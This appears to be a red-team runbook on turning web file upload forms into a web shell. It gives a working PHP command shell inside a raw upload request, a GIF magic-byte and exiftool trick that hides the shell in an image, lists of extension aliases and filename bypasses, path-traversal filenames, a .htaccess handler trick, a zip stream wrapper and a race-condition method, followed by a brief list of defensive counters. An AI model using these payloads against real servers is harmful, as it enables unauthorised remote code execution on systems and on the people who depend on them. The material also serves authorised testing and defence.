# Runbook: File upload to web shell

An upload form that lets the wrong file land in a place the server will execute is one of the
shortest routes to code execution. The work is mostly bypassing whatever validation stands
between the upload and an executable file in a reachable path. This runbook walks the bypass
ladder from a naive upload to a working shell.

## Prerequisites

- Every upload feature found during recon, with the request captured in Repeater.
- Knowledge of the server-side language where identifiable (PHP, ASP, JSP), which decides the
  shell payload.
- A place to retrieve the uploaded file: the URL it is served from, or a path that includes
  it.

## Phase 1: Baseline upload

Upload a benign file of the expected type and find where it is served. Confirm the path,
whether the original filename is preserved, and whether the served response executes or
returns the file verbatim. That served path is the target for every later attempt.

## Phase 2: Plant a shell with no filter

Try the obvious case first: upload a minimal shell with the executable extension.

```
POST /images/upload/ HTTP/1.1
Content-Disposition: form-data; name="file"; filename="s.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

Request the served file with `?cmd=id`. Command output confirms execution.

## Phase 3: Content-Type and magic-byte bypass

Where the server validates the declared type, change `Content-Type` to an accepted value
(`image/png`, `image/gif`) while keeping the executable extension. Where it inspects file
contents, prepend a valid signature so the file passes as an image but the engine still runs
the trailing code:

```
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```

exiftool plants the same payload in a real image's metadata:

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' clean.jpg -o shell.php
```

## Phase 4: Extension filter bypass

Against a blacklist, reach for an executable alias the filter missed:

```
.phtml .pht .php3 .php4 .php5 .phar .inc      # PHP aliases
.aspx .cer .asa                                # ASP aliases
.jspx .jsw .jsv .jspf                          # JSP aliases
.pHp .PhAr                                      # mixed case where matching is case-sensitive
```

Against a whitelist that only checks part of the name, try double extensions and
terminators:

```
shell.php.jpg      shell.jpg.php
shell.php%00.jpg   shell.php%20   shell.php%0d%0a.jpg
shell.php.....     shell.php/      shell.php#.png
```

## Phase 5: Path traversal in the filename

Where the upload directory itself is non-executable, a traversal sequence in the `filename`
can place the file somewhere that runs it:

```
filename="../shell.php"
filename="..%2fshell.php"
```

Confirm by requesting the file from the traversed location rather than the upload directory.

## Phase 6: Configuration and archive tricks

- Upload a `.htaccess` carrying `AddType application/x-httpd-php .l33t`, then upload the shell
  as `shell.l33t`, which Apache now executes as PHP.
- Where archives are unpacked server-side, zip the shell and reference it through a stream
  wrapper (`zip://path/file.zip#shell.php`).

## Phase 7: Race the validator

Some servers write the file, then scan and delete it if it fails validation. The gap is
exploitable: upload the shell and, in parallel, request it repeatedly until one request hits
the window before deletion. Burp's single-packet technique or a tight request loop drives
this.

## Output

- The bypass that worked and the served path of the shell.
- Demonstrated command execution (the output of `id` or equivalent).
- For non-RCE outcomes, the secondary impact the file type allowed (SVG to stored XSS or XXE,
  for example).

## Techniques

- [File uploads](../techniques/shells.md)
- [Path traversal](traversal.md)
- [Race conditions](../techniques/race.md)

## Counter moves

Runbook: File upload to web shell is what this page works through. An extension allowlist,
renaming on write, serving uploads from a non-executing store, and validating before the file
is reachable are the counters. The defensive counterpart is in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
